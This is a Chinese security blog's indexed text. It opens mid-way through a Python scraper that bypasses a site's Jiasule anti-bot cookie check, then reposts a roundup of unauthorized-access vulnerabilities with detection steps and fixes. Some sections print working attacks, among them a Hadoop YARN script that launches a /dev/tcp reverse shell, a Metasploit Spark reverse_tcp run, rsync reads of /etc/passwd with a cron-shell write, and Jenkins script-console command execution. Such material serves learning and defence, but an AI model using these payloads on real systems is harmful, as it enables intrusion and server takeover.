aa_encode_text = re.search('document.cookie=(.*?);location', response.text).group(1) __jsl_clearance_s = execjs.eval(aa_encode_text).split(\";\")[0] cookies[\"__jsl_clearance_s\"] = __jsl_clearance_s.split(\"=\")[1] logger.info(f\"get_first_cookie: {cookies}\") return cookies def get_second_cookie_go_params(url, headers: dict, cookies: dict): response = session.get(url, headers=headers, cookies=cookies) go_params = re.findall(r';go\\((.*?)\\)\u003c/script\u003e', response.text)[0] return json.loads(go_params) def get_final_jsl_clearance(data: dict): chars = len(data['chars']) for i in range(chars): for j in range(chars): clearance = data['bts'][0] + data['chars'][i] + data['chars'][j] + data['bts'][1] encrypt = None if data['ha'] == 'md5': encrypt = hashlib.md5() elif data['ha'] == 'sha1': encrypt = hashlib.sha1() elif data['ha'] == 'sha256': encrypt = hashlib.sha256() encrypt.update(clearance.encode()) result = encrypt.hexdigest() if result == data['ct']: return clearance def get_response_data(url, headers, cookies): response = session.post(url=url, params={\"max\": 20, \"offset\": 20}, headers=headers, cookies=cookies) response.encoding = \"utf-8\" logger.success(response.text) def get_second_cookies(cookies, go_params): # 方法一：原始js, 这里只有sha1的，所以md5和sha256时会拿不到数据，请按照教程自己分析 __jsl_clearance_s = execjs.compile(open(\"final.js\", \"r\", encoding=\"utf-8\").read()).call(\"go\", go_params) logger.info(go_params) # 方法二： js改写 # __jsl_clearance_s = execjs.compile(open(\"__jsl_clearance_s.js\", \"r\", encoding=\"utf-8\").read()).call( # \"get__jsl_clearance_s\", go_params) # 方法三：python改写 # __jsl_clearance_s = get_final_jsl_clearance(go_params) # 通过python脚本获取到jsl_clearance_s cookies[\"__jsl_clearance_s\"] = __jsl_clearance_s logger.debug(f\"cookies: {cookies}\") return cookies def main(): url = 'https://www.xxxx.xxx.cn/flaw/typelist?typeId=27' headers = { 'User-Agent': ua.random } cookies = get_first_cookie(url, headers) go_params = get_second_cookie_go_params(url, headers, cookies) cookies = get_second_cookies(cookies, go_params) logger.info(go_params) get_response_data(url, headers, cookies) if __name__ == '__main__': main() ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:9:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#结果验证"},{"categories":["逆向"],"content":" 小结遵循文章的指导逆向操作整个解密流程，您会发现这一过程相对简单。关键在于熟练掌握三次请求的顺序及其各自的特征，一旦熟悉这些要点，整个过程将无甚难度。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:10:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#小结"},{"categories":["逆向"],"content":" 最后如果你觉得文章还不错，请大家点赞、关注、分享、在看下，因为这将是我持续输出更多优质文章的最强动力！ 欢迎随时与我联系，我期待与大家交流心得，共同学习，共同进步。 ","date":"2024-10-06","objectID":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/:11:0","series":null,"tags":["加速乐"],"title":"逆向分析某网站加速乐参数流程详解","uri":"/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%9F%90%E7%BD%91%E7%AB%99%E5%8A%A0%E9%80%9F%E4%B9%90%E5%8F%82%E6%95%B0%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3/#最后"},{"categories":["学习"],"content":" 转载自： https://www.freebuf.com/articles/web/338459.html 本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担 本文导读： 尽量覆盖了目前网络资讯上公布的30+种未授权访问漏洞 融入了本人的学习经验和心得，把未授权访问漏洞按照默认端口顺序从小到大排列，对于默认端口可进行批量端口探测服务，再进一步进行漏洞检测，逻辑清晰，方便学者学习和漏洞复现。 本文涵盖漏洞描述、漏洞检测和漏洞修复建议为一体，深层次利用不在本文，可自行网上搜索。 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:0:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#"},{"categories":["学习"],"content":" 未授权访问漏洞介绍未授权访问漏洞是一个在企业内部非常常见的问题，未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。 演示环境搭建 使用vulhub搭建漏洞演示环境 参考：https://vulhub.org/#/docs/install-docker/ ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:1:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#未授权访问漏洞介绍"},{"categories":["学习"],"content":" 未授权访问漏洞汇总预览 FTP 未授权访问（21） LDAP 未授权访问（389） Rsync 未授权访问（873） ZooKeeper 未授权访问（2181） Docker 未授权访问（2375） Docker Registry未授权（5000） Kibana 未授权访问（5601） VNC 未授权访问（5900、5901） CouchDB 未授权访问（5984） Apache Spark 未授权访问（6066、8081、8082） Redis 未授权访问（6379） Weblogic 未授权访问（7001） HadoopYARN 未授权访问（8088） JBoss 未授权访问（8080） Jenkins 未授权访问（8080） Kubernetes Api Server 未授权（8080、10250） Active MQ 未授权访问（8161） Jupyter Notebook 未授权访问（8888） Elasticsearch 未授权访问（9200、9300） Zabbix 未授权访问（10051） Memcached 未授权访问（11211） RabbitMQ 未授权访问（15672、15692、25672） MongoDB 未授权访问（27017） NFS 未授权访问（2049、20048） Dubbo 未授权访问（28096） Druid 未授权访问 Solr 未授权访问 SpringBoot Actuator 未授权访问 SwaggerUI未授权访问漏洞 Harbor未授权添加管理员漏洞 Windows ipc共享未授权访问漏洞 宝塔phpmyadmin未授权访问 WordPress未授权访问漏洞 Atlassian Crowd 未授权访问 PHP-FPM Fastcgi未授权访问漏洞 uWSGI未授权访问漏洞 Kong未授权访问漏洞(CVE-2020-11710) ThinkAdminV6未授权访问漏洞 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:2:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#未授权访问漏洞汇总预览"},{"categories":["学习"],"content":" 1. FTP 未授权访问（21）漏洞简介 FTP 弱口令或匿名登录漏洞，一般指使用 FTP 的用户启用了匿名登录功能，或系统口令的长度太短、复杂度不够、仅包含数字、或仅包含字母等，容易被黑客攻击，发生恶意文件上传或更严重的入侵行为。 漏洞检测 1、端口扫描 2、直接访问ftp路径：ftp://ip:port/ 禁止匿名登录； 配置强密码，密码长度建议八位以上，且密码应包括大小写字母、特殊字符、数字混合体； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:3:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#1-ftp-未授权访问21"},{"categories":["学习"],"content":" 2. LDAP 未授权访问（389）漏洞简介 LDAP中文全称为：轻型目录访问协议（Lightweight Directory Access Protocol），默认使用389， LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问。 漏洞检测 1、端口扫描 2、使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser工具（下载：https://ldapbrowserwindows.com/）直接连接，获取目录内容。 漏洞修复 修改ldap的acl，禁止匿名访问。 根据业务设置ldap访问白名单或黑名单； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:4:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#2-ldap-未授权访问389"},{"categories":["学习"],"content":" 3. Rsync 未授权访问（873）漏洞简介 rsync是Linux/Unix下的一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件和目录，默认运行在873端口。由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。 漏洞检测 1、端口扫描 2、root@kali使用Rsync命令即可进行检测。 rsync rsync://192.168.126.130:873/ rsync rsync://192.168.126.130:873/src 利用rsync下载任意文件 rsync rsync://192.168.126.130:873/src/ etc/passwd ./ 或者写入任意文件 rsync -av shell rsync://192.168.126.130:873/src/etc/cron.d/shell 漏洞修复 隐藏掉 module 信息：修改配置文件 list =false。 权限控制：不需要写入权限的 module 的设置为只读 Read only = true; 网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问; 账户认证：只允许指定的用户利用指定的密码使用 rsync 服务; 数据加密传输：Rsync 默认没有直接支持加密传输，如果需要 Rsync 同步重要性很高的数据，可以使用 ssh; 参考文章：https://www.freebuf.com/column/202771.html ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:5:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#3-rsync-未授权访问873"},{"categories":["学习"],"content":" 4. ZooKeeper 未授权访问（2181）漏洞简介 ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。 漏洞检测 端口扫描 漏洞复现 执行root@kali:~# echo envi|nc 192.168.131.128 2181 获取服务器环境信息： root@kali:~# echo stat |nc 192.168.131.128 2181 漏洞修复 为ZooKeeper配置相应的访问权限； 设置防火墙策略； 禁止把Zookeeper直接暴露在公网； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:6:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#4-zookeeper-未授权访问2181"},{"categories":["学习"],"content":" 5. Docker 未授权访问（2375）漏洞简介 该未授权访问漏洞是因为Docker API可以执行Docker命令，该接口是目的是取代Docker命令界面，通过URL操作Docker。 漏洞检测 端口扫描 直接输入地址 http://your-ip:2375/version。若能访问，证明存在未授权访问漏洞。 漏洞修复 对2375端口做网络访问控制，如ACL控制，或者访问规则； 修改docker swarm的认证方式，使用TLS认证； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:7:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#5-docker-未授权访问2375"},{"categories":["学习"],"content":" 6. Docker Registry未授权（5000）默认5000端口，docker remote api可以执行docker命令，该接口是目的是取代docker 命令界面，通过url操作docker。 漏洞检测： 1、端口扫描 2、http://10.101.20.43:5000/v2 http://10.101.20.43:5000/v2/_catalog 安全建议 1、设置ACL，只允许信任ip连接对应端口 2、开启TLS，使用生成的证书进行认证 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:8:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#6-docker-registry未授权5000"},{"categories":["学习"],"content":" 7. Kibana 未授权访问（5601）漏洞简介 Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。 漏洞检测 端口扫描 直接访问kibana的页面 http://192.168.126.130:5601/ https://192.168.126.130/app/kibana# http://192.168.126.130:5601/app/kibana#/ 无需账号密码可以登录进入界面 漏洞修复 设置kibana监听本地地址，并设置ElasticSearch登录的账号和密码； 设置防火墙策略，限定IP访问服务； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:9:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#7-kibana-未授权访问5601"},{"categories":["学习"],"content":" 8. VNC 未授权访问（5900、5901）漏洞简介 VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT\u0026T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。 VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重。 漏洞检测 端口扫描 使用 VNC 客户端连接主机 VNC-Viewer工具下载(https://www.realvnc.com/en/connect/download/viewer/windows/) 安装过程，双击msi文件一路下一步就可以了。 在 VNC 客户端输入目标服务器IP，之后点击确定、连接，即可成功控制目标服务器 漏洞修复 配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码； 以最小权限的普通用户身份运行操作系统； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:10:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#8-vnc-未授权访问59005901"},{"categories":["学习"],"content":" 9. CouchDB 未授权访问（5984）漏洞简介 Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。 在官方配置文档中对HTTP Server的配置有WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。 漏洞检测 1、端口扫描 2、未授权访问kali测试命令 curl 192.168.126.130:5984 curl 192.168.126.130:5984/\\_config 漏洞修复 指定CouchDB绑定的IP （需要重启CouchDB才能生效）在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。 注：修改后只有本机才能访问CouchDB。 设置访问密码（需要重启CouchDB才能生效）在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码。 设置 WWW-Authenticate，强制认证。 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:11:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#9-couchdb-未授权访问5984"},{"categories":["学习"],"content":" 10. Apache Spark 未授权访问（6066、8081、8082）漏洞简介 Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。 漏洞检测 nmap扫描出如下端口开放，则很有可能存在漏洞 使用msf工具getshell msf5\u003euse exploit/linux/http/spark\\_unauth\\_rce msf5\u003eset payload java/meterpreter/reverse\\_tcp msf5\u003eset rhost 192.168.100.2 msf5\u003eset rport 6066 msf5\u003eset lhost 192.168.100.1 msf5\u003eset lport 4444 msf5\u003eset srvhost 192.168.100.1 msf5\u003eset srvport 8080 msf5\u003eexploit 漏洞修复 对外关闭敏感端口； 配置用户权限认证； 参考文章：https://www.cnblogs.com/KevinGeorge/p/10399844.html ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:12:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#10-apache-spark-未授权访问606680818082"},{"categories":["学习"],"content":" 11. Redis 未授权访问（6379）漏洞简介 redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。 Redis未授权访问在4.x/5.0.5以前版本下，可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令。 漏洞检测 端口扫描 Kali连接主机 （1）kali安装redis-cli远程连接工具 wget http://download.redis.io/redis-stable.tar.gz tar -zxvf redis-stable.tar.gz cd redis-stable make cp src/redis-cli /usr/bin/ redis-cli -h （2）使用redis-cli命令直接远程免密登录redis主机 redis-cli -h 目标主机IP （3）尝试keys * 命令，若存在以下页面，则存在漏洞 （4）进一步利用 利用redis 可视化工具Another Redis Desktop Manager 漏洞修复 到redis安装目录下，配置redis.conf文件： 默认只对本地开放 bind 127.0.0.1 添加登陆密码 修改 redis.conf 文件，添加 requirepass mypasswd 在需要对外开放的时候修改默认端口（端口不重复就可以） port 2344 以低权限运行 Redis 服务（重启redis才能生效） 为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆 最后还可以配合iptables限制开放 ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:13:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#11-redis-未授权访问6379"},{"categories":["学习"],"content":" 12. Weblogic 未授权访问（7001）漏洞简介 Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。 CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。 漏洞检测 端口扫描 使用vulhub搭建漏洞演示环境 cd vulhub/weblogic/CVE-2020-14882 sudo docker-compose up –d 攻击者可以构造特殊请求的URL，即可未授权访问到管理后台页面： http://192.168.126.130:7001/console/css/%252e%252e%252fconsole.portal 远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。 漏洞修复 下载补丁程序并安装更新； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:14:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#12-weblogic-未授权访问7001"},{"categories":["学习"],"content":" 13. HadoopYARN 未授权访问（8088）漏洞简介 Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。 此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。 漏洞检测 端口扫描 使用vulhub搭建漏洞演示环境 cd /vulhub/hadoop/unauthorized-yarn docker-compose up -d 3、环境启动后，没有配置身份认证，可以未授权访问到Hadoop YARN ResourceManager WebUI页面。 http://192.168.126.130:8088/ http://192.168.126.130:8088/cluster 利用该漏洞，可以进一步getshell 脚本源码如下：rce.py #!/usr/bin/env python import requests target = 'http://192.168.126.130:8088/' # 设置目标主机的ip地址 lhost = '192.168.126.128' # 设置你攻击主机的监听ip地址，并且监听端口为9999 url = target + 'ws/v1/cluster/apps/new-application' resp = requests.post(url) app_id = resp.json()['application-id'] url = target + 'ws/v1/cluster/apps' data = { 'application-id': app_id, 'application-name': 'get-shell', 'am-container-spec': { 'commands': { 'command': '/bin/bash -i \u003e\u0026 /dev/tcp/%s/9999 0\u003e\u00261' % lhost, }, }, 'application-type': 'YARN', } requests.post(url, json=data) 漏洞修复 升级Hadoop到x版本以上，并启用Kerberos认证功能，禁止匿名访问; 设置“安全组”访问控制策略，将 Hadoop 默认开放的多个端口对公网全部禁止或限制可信任的 IP 地址才能访问包括 50070 以及 WebUI 等相关端口； 如无必要，关闭 Hadoop Web 管理页面； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:15:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#13-hadoopyarn-未授权访问8088"},{"categories":["学习"],"content":" 14. JBoss 未授权访问（8080）漏洞简介 漏洞简述JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 http://ip:8080/jmx-console，就可以浏览 Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。 漏洞检测 端口扫描 直接访问 http://ip:port/，看是否能进入 jmx-console 和 web-console 页面 http://ip:8080/ http://ip:8080/jmx-console/ http://ip:8080/jbossws/ 漏洞修复 添加 JMX 控制页面身份认证； 进行JMX Console 安全配置； 关闭jmx-console和web-console; ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:16:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#14-jboss-未授权访问8080"},{"categories":["学习"],"content":" 15. Jenkins 未授权访问（8080）漏洞简介 默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。 漏洞检测 端口扫描 直接通过url输入以下地址，若能访问，证明存在未授权访问漏洞。 http://\u003ctarget\u003e:8080/manage http://\u003ctarget\u003e:8080/script 未授权访问 http://:8080/script，可以执行系统命令 命令格式 println 'whoami'.execute().text 漏洞修复 对后台控制页面做登录验证限制； 升级Jenkins至新版本； 禁止把Jenkins直接暴露在公网； ","date":"2024-10-03","objectID":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/:17:0","series":null,"tags":["总结","未授权访问"],"title":"常用的38种未授权访问漏洞汇总","uri":"/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/#15-jenkins-未授权访问8080"},{"categories":["学习"],"content":" 16. Kubernetes Api Server 未授权（8080、10250）漏洞简介 Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。 漏洞检测 端口扫描 使用nmap寻找相关的端口和服务，直接访问脆弱的服务 检测 （1）端口：8080 http://10.10.4.89:8080/ （2）端口：8080：api dashboard：http://10.10.4.89:8080/ui （3）端口：10250端口是kubelet API的HTTPS端口，通过路径:https://xxx/10250/pods获取环境变量、运行的容器信息、命名空间等信息。 漏洞修复 进行授权认证； 使用Service Account令牌； 设置防火墙策略，限定IP访问服务； 